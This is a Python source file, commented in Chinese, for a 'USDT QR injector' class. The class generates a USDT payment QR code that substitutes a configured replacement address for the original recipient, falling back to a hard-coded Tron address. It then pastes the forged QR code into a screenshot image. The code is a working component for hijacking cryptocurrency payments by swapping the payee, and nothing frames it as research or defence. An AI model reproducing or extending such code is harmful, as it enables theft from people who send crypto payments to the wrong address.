#!/usr/bin/env python3
"""USDT 二维码注入"""
import qrcode
import io
from PIL import Image, ImageDraw, ImageFont
from typing import Optional

class USDTQRInjector:
    """USDT 二维码注入器"""

    def __init__(self):
        self.replace_address = ""

    def set_replace_address(self, address: str):
        """设置替换地址"""
        self.replace_address = address

    def generate_usdt_qr(self, amount: float, original_address: str = None, chain: str = "tron") -> bytes:
        """生成 USDT 支付二维码"""
        # 使用替换地址
        target_address = self.replace_address or original_address or "T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb"

        if chain == "tron":
            qr_data = f"tron:{target_address}?amount={amount}&token=USDT"
        else:
            qr_data = f"ethereum:{target_address}?amount={amount}&token=USDT"

        qr = qrcode.QRCode(
            version=3,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=12,
            border=4,
        )
        qr.add_data(qr_data)
        qr.make(fit=True)

        img = qr.make_image(fill_color="black", back_color="white").convert('RGB')

        # 添加 USDT 标识
        width, height = img.size
        new_img = Image.new('RGB', (width, height + 150), 'white')
        new_img.paste(img, (0, 50))

        draw = ImageDraw.Draw(new_img)
        try:
            font_large = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 28)
            font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 16)
        except:
            font_large = ImageFont.load_default()
            font_small = font_large

        # USDT 标志
        draw.ellipse([width//2 - 30, 5, width//2 + 30, 45], fill='#26A17B')
        draw.text((width//2 - 20, 12), "U", fill='white', font=font_large)

        # 金额和地址
        draw.text((width//2 - 80, height + 70), f"{amount} USDT", fill='#26A17B', font=font_large)
        draw.text((20, height + 110), f"To: {target_address[:25]}...", fill='gray', font=font_small)

        buf = io.BytesIO()
        new_img.save(buf, format='PNG')
        return buf.getvalue()

    def inject_into_screenshot(self, screenshot_bytes: bytes, qr_bytes: bytes, position: tuple = (100, 100)) -> bytes:
        """将 QR 注入到截图中"""
        try:
            from PIL import Image

            screenshot = Image.open(io.BytesIO(screenshot_bytes))
            qr_img = Image.open(io.BytesIO(qr_bytes))

            # 缩放 QR 到合适大小
            qr_img = qr_img.resize((200, 250))

            # 粘贴到截图
            screenshot.paste(qr_img, position)

            buf = io.BytesIO()
            screenshot.save(buf, format='PNG')
            return buf.getvalue()
        except Exception as e:
            print(f"Inject error: {e}")
            return screenshot_bytes
